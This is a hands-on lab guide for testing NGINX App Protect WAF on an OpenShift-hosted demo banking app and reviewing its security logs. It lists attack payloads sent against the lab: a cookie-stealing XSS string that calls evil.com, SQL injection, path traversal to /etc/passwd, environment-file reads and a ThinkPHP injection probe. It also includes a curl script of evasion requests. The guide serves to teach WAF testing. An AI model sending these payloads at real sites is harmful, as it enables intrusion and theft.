Access the Application and test the NGINX App Protect WAF to see how it works in action
--------------------------------------------------------------------------------------- 


Now that NGINX App Protect WAF is enabled, let's test its ability to protect against Layer 7 attacks. Follow these steps:

Launch the Firefox browser and open Arcadia Finance app:

    #. In the Browser, open NGINX Ingress Controller URL to access Arcadia app (replace with the nginx-ingress EXTERNAL-IP): http://EXTERNAL-IP/
    #. Click on ``Login`` and use the credentials ``matt:ilovef5``
    #. You should see all the apps running (main, back, app2 and app3)
    #. Execute the same XSS attack we did in Module 1 by appending ``?a=<script>`` to the end of the application URL. Observe that the attack is now blocked and the user is provided with a support ID.

        .. code-block:: html
            
                The requested URL was rejected. Please consult with your administrator.
            
                Your support ID is: 14609283746114744748
            
                [Go Back]
                
        .. note:: Did you notice the blocking page is similar to F5 ASM and Adv. WAF ?


        .. image:: ./pictures/image18.png
        
    #. Execute the second attack by appending ``?item='><script>document.location='http://evil.com/steal'+document.cookie</script>`` to the application URL, and observe the results

        .. image:: ./pictures/image19.png 

    #. Feel free to execute any attacks you would like and observe the results.

Congratulations on securing your application!


**Here are some optional attacks you can try**

- SQL Injection - ``GET /?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+``
- Remote File Include - ``GET /?hfsagrs=php%3A%2F%2Ffilter%2Fresource%3Dhttp%3A%2F%2Fgoogle.com%2Fsearch``
- Command Execution - ``GET /?hfsagrs=%2Fproc%2Fself%2Fenviron``
- HTTP Parser Attack - ``GET /?XDEBUG_SESSION_START=phpstorm``
- Predictable Resource Location Path Traversal - ``GET /lua/login.lua?referer=google.com%2F&hfsagrs=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd``
- Cross Site Scripting - ``GET /lua/login.lua?referer=google.com%2F&hfsagrs=+oNmouseoVer%3Dbfet%28%29+``
- Informtion Leakage - ``GET /lua/login.lua?referer=google.com%2F&hfsagrs=efw``
- HTTP Parser Attack Forceful Browsing - ``GET /dana-na/auth/url_default/welcome.cgi``
- Non-browser Client,Abuse of Functionality,Server Side Code Injection,HTTP Parser Attack - ``GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP``
- Cross Site Scripting - ``GET / HTTP/1.1\r\nHost: <ATTACKED HOST>\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nCookie: hfsagrs=%27%22%5C%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\r\n\r\n"``


**and many more from bash script below**

        .. code-block :: bash

                #!/bin/bash
                echo "------------------------------"
                echo "Starting security testing..."
                echo "------------------------------"
                echo ""
                echo ""

                # Get the external IP address of the NGINX Ingress Controller
                EXTERNAL_IP=$(oc get service my-nginx-ingress-controller-nginx-ingress -n nginx-ingress | awk 'NR==2{print $4}')

                echo "---------------------------------------------------------------------"
                echo "Multiple decoding"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/three_decodin%2525252567.html'"
                echo "---------------------------------------------------------------------"

                # Send a request with multiple decoding
                curl -k "http://$EXTERNAL_IP/three_decodin%2525252567.html"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "Apache Whitespace"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/tab_escaped%09.html'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with Apache whitespace
                curl -k "http://$EXTERNAL_IP/tab_escaped%09.html"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "IIS Backslashes"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/regular%5cescaped_back.html'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with IIS backslashes
                curl -k "http://$EXTERNAL_IP/regular%5cescaped_back.html"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "Apache Whitespace"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with Apache whitespace
                curl -k "http://$EXTERNAL_IP/carriage_return_escaped%0d.html?x=1&y=2"
                sleep 3

                echo "-----------------------------------------------------------------------------"
                echo "Cross site scripting"
                echo "Sending: curl -k 'http://$EXTERNAL_IP/%25%25252541PPDATA%25'"
                echo "-----------------------------------------------------------------------------"

                # Send a request with cross-site scripting payload
                curl -k "http://$EXTERNAL_IP/%25%25252541PPDATA%25"



Security Logging
#################

To verify that F5 Application Protection WAF is logging security events, follow these steps:

#. Get the local syslog server POD by running ``oc get pod -o wide``

        Example: 

        .. code-block:: bash

                [lab-user@bastion app-protect-waf]$ oc get pod -o wide
                NAME                       READY   STATUS    RESTARTS   AGE   IP            NODE                                         NOMINATED NODE   READINESS GATES
                app2-6bd5b4fbd7-fdcp2      1/1     Running   0          70m   10.128.2.51   ip-10-0-186-204.us-east-2.compute.internal   <none>           <none>
                app3-5699b95596-2fvgv      1/1     Running   0          70m   10.128.2.52   ip-10-0-186-204.us-east-2.compute.internal   <none>           <none>
                backend-79c6bcf85c-9zdhl   1/1     Running   0          70m   10.129.2.41   ip-10-0-241-74.us-east-2.compute.internal    <none>           <none>
                main-584fc64db4-kz5c8      1/1     Running   0          70m   10.131.0.22   ip-10-0-223-88.us-east-2.compute.internal    <none>           <none>
                syslog-bb47bd798-mhh64     1/1     Running   0          25m   10.129.2.46   ip-10-0-241-74.us-east-2.compute.internal    <none>           <none>

#. Examine the logging matching the support ID of `436359350950` 

        Example: 

        .. code-block:: bash

                [lab-user@bastion app-protect-waf]$ oc exec -it pod/syslog-bb47bd798-mhh64  -- cat /var/log/messages | grep 7175144470433567675
                Mar 13 23:27:22 my-nginx-ingress-controller-nginx-ingress-59cc967797-2vjjr ASM:attack_type="Detection Evasion,Other Application Activity,Brute Force Attack",blocking_exception_reason="N/A",date_time="2023-03-13 23:27:21",dest_port="80",ip_client="10.0.117.68",is_truncated="false",method="GET",policy_name="dataguard-alarm",protocol="HTTP",request_status="blocked",response_code="0",severity="Critical",sig_cves="N/A",sig_ids="300000000",sig_names="Apple_medium_acc [Fruits]",sig_set_names="{apple_sigs}",src_port="14788",sub_violations="Evasion technique detected:Multiple decoding",support_id="7175144470433567675",threat_campaign_names="N/A",unit_hostname="my-nginx-ingress-controller-nginx-ingress-59cc967797-2vjjr",uri="/%%41PPDATA%",violation_rating="4",vs_name="78-a857711ef4fc64492b21ce56624275e3-609642109.us-east-2.elb.amazonaws.com:8-/",x_forwarded_for_header_value="N/A",outcome="REJECTED",outcome_reason="SECURITY_WAF_VIOLATION",violations="Evasion technique detected,Attack signature detected,Violation Rating Threat detected",json_log="{""violations"":[{""enforcementState"":{""isBlocked"":false},""violation"":{""name"":""VIOL_EVASION""}},{""enforcementState"":{""isBlocked"":true},""violation"":{""name"":""VIOL_RATING_THREAT""}},{""enforcementState"":{""isBlocked"":true},""signature"":{""name"":""Apple_medium_acc [Fruits]"",""signatureId"":300000000},""violation"":{""name"":""VIOL_ATTACK_SIGNATURE""}}]}",violation_details="<?xml version='1.0' encoding='UTF-8'?><BAD_MSG><violation_masks><block>410000000200c00-3a03030c30000072-8000000000000000-0</block><alarm>2577f0ffcbbd0fea-befbf35cb000007e-8000000000000000-0</alarm><learn>0-0-0-0</learn><staging>0-0-0-0</staging></violation_masks><request-violations><violation><viol_index>42</viol_index><viol_name>VIOL_ATTACK_SIGNATURE</viol_name><context>header</context><header><header_name>VXNlci1BZ2VudA==</header_name><header_value>TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjAuMCBTYWZhcmkvNTM3LjM2</header_value><header_pattern>*</header_pattern><staging>0</staging></header><staging>0</staging><sig_data><sig_id>300000000</sig_id><blocking_mask>3</blocking_mask><kw_data><buffer>dG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBH</buffer><offset>30</offset><length>5</length></kw_data></sig_data></violation><violation><viol_index>7</viol_index><viol_name>VIOL_EVASION</viol_name><context>uri</context><evasions><buffer>LyUyNSUyNTI1MjU0MVBQREFUQSUyNQ==</buffer><offset>4</offset><length>7</length><blocking_mask>16</blocking_mask></evasions></violation></request-violations></BAD_MSG>",bot_signature_name="N/A",bot_category="N/A",bot_anomalies="N/A",enforced_bot_anomalies="N/A",client_class="Browser",client_application="Chrome",client_application_version="109",request="GET /%25%25252541PPDATA%25 HTTP/1.1\r\nHost: a857711ef4fc64492b21ce56624275e3-609642109.us-east-2.elb.amazonaws.com\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n",transport_protocol="HTTP/1.1"

        Where ``pod/syslog-bb47bd798-mhh64`` is the name of the pod and container where the syslog server is running. ``7175144470433567675`` is support ID of the attack.
Congratulations on completing the Lab! You have learned how to deploy the NGINX App Protect WAF in Kubernetes and how to use the NGINX App Protect WAF to protect your applications from attacks.




        